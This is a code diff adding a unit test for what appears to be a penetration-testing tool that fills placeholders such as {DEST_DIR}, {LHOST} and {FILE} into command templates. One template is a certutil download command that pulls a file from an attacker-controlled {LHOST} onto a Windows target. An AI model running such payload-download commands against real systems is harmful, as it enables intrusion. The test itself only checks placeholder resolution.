@@ -384,6 +384,18 @@ describe('arsenal tokens', () => {
     expect(text('{DEST_DIR}', { host: host({ os: 'linux' }) }).text).toBe('/tmp');
   });
 
+  it('DEST_DIR never guesses: without a host OS it follows the command OS, else stays unresolved', () => {
+    const dash = host({ id: '', name: '', ip: null, os: null as unknown as Host['os'] });
+    const certutil = 'certutil -urlcache -split -f http://{LHOST}/{FILE} {DEST_DIR}\\{FILE}';
+    expect(fillCommand(certutil, input({ host: dash, overrides: { FILE: 'a.exe' } }), { commandOs: 'windows' }).text).toContain('C:\\Windows\\Temp\\a.exe');
+    expect(fillCommand('wget x -O {DEST_DIR}/x', input({ host: dash }), { commandOs: 'linux' }).text).toBe('wget x -O /tmp/x');
+    expect(fillCommand('cp x {DEST_DIR}', input({ host: dash }), { commandOs: 'any' }).unresolved).toEqual(['DEST_DIR']);
+    expect(fillCommand('cp x {DEST_DIR}', input({ host: dash })).unresolved).toEqual(['DEST_DIR']);
+    expect(fillCommand('cp x {DEST_DIR}', input({ host: host({ os: 'other' }) }), { commandOs: 'any' }).unresolved).toEqual(['DEST_DIR']);
+    // The host's OS wins over the command's.
+    expect(fillCommand('{DEST_DIR}', input({ host: host({ os: 'linux' }) }), { commandOs: 'windows' }).text).toBe('/tmp');
+  });
+
   it('PORT uses the first port hint and stays unresolved without one', () => {
     expect(text('{PORT}', { portHint: [8080, 80] }).text).toBe('8080');
     expect(text('{PORT}', { portHint: [] }).unresolved).toEqual(['PORT']);
